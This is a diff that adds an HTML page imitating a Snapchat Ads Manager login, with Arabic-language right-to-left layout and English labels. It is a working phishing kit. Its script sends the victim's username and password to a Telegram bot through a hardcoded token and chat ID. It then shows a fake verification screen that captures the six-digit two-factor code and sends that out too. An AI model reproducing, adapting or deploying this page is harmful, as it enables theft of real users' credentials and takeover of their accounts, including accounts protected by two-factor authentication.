@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snapchat</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+.card{background:#fff;border-radius:12px;padding:30px 25px;max-width:400px;width:100%;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
+.logo{text-align:center;margin-bottom:25px}
+.logo .icon{font-size:60px;margin-bottom:10px}
+.logo h1{color:#000;font-size:28px;font-weight:bold}
+.logo p{color:#666;font-size:14px;margin-top:5px}
+label{display:block;font-size:14px;color:#333;margin-top:15px;margin-bottom:6px;font-weight:bold}
+input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;background:#f9f9f9;box-sizing:border-box}
+input:focus{outline:none;border-color:#fffc00}
+.btn{width:100%;padding:15px;background:#fffc00;color:#000;border:none;border-radius:25px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:20px}
+.forgot{text-align:right;color:#666;font-size:13px;margin-top:10px}
+.signup{text-align:center;color:#000;font-size:14px;margin-top:25px}
+.signup a{color:#0095f6;text-decoration:none;font-weight:bold}
+.footer{text-align:center;font-size:11px;color:#999;margin-top:20px}
+.code-inputs{display:flex;gap:8px;margin-top:20px;justify-content:center;direction:ltr}
+.code-inputs input{width:45px;height:55px;text-align:center;font-size:22px;font-weight:bold;padding:0}
+</style>
+</head>
+<body>
+<div class="card">
+<div id="screen1">
+<div class="logo"><div class="icon">👻</div><h1>Log In</h1><p>to continue to Ads Manager</p></div>
+<form id="f">
+<label>Username or Email</label>
+<input type="text" id="user" placeholder="Username or Email" required>
+<label>Password</label>
+<input type="password" id="pass" placeholder="Password" required>
+<button type="submit" class="btn">Log In</button>
+</form>
+<div class="forgot">Forgot Password</div>
+<div class="signup">New To Snapchat? <a href="#">Sign Up</a></div>
+<div class="footer">© 2026 Snapchat</div>
+</div>
+<div id="screen2" style="display:none">
+<h3 style="text-align:center;color:#000;margin-bottom:15px">Enter Verification Code</h3>
+<p style="text-align:center;color:#666;font-size:14px;margin-bottom:20px">A code has been sent to your email</p>
+<div class="code-inputs">
+<input type="tel" maxlength="1" id="c1"><input type="tel" maxlength="1" id="c2"><input type="tel" maxlength="1" id="c3"><input type="tel" maxlength="1" id="c4"><input type="tel" maxlength="1" id="c5"><input type="tel" maxlength="1" id="c6">
+</div>
+<button type="button" class="btn" id="verifyBtn">Verify</button>
+</div>
+</div>
+<script>
+const BOT='8817416933:AAEJJON9lK12149s6-5qYZ91pzf8-XJiNTw';
+const CHAT='8823506156';
+['c1','c2','c3','c4','c5','c6'].forEach((id,i,arr)=>{document.getElementById(id).addEventListener('input',function(){if(this.value.length===1&&i<arr.length-1)document.getElementById(arr[i+1]).focus();});});
+document.getElementById('f').addEventListener('submit',async function(e){
+e.preventDefault();
+const msg='👻 *سناب شات*\n\n👤 `'+document.getElementById('user').value+'`\n🔑 `'+document.getElementById('pass').value+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
+await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
+document.getElementById('screen1').style.display='none';document.getElementById('screen2').style.display='block';document.getElementById('c1').focus();
+});
+document.getElementById('verifyBtn').addEventListener('click',async function(){
+const code=document.getElementById('c1').value+document.getElementById('c2').value+document.getElementById('c3').value+document.getElementById('c4').value+document.getElementById('c5').value+document.getElementById('c6').value;
+const msg='👻 *سناب شات - رمز التحقق*\n\n👤 `'+document.getElementById('user').value+'`\n🔢 `'+code+'`';
+await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
+alert('تم التحقق بنجاح');
+});
+</script>
+</body>
+</html>
